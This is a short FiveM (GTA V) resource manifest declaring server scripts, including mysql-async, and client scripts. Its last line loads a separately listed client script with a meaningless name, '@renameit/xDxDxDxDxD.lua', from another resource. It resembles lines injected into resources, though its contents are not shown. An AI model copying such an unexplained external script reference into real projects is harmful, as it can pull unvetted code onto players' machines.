fx_version('bodacious')
game('gta5')

server_script {
	'@mysql-async/lib/MySQL.lua',
	'server/main.lua'
}


client_scripts {
	'client/main.lua',
	'config.lua'
}

client_script '@renameit/xDxDxDxDxD.lua'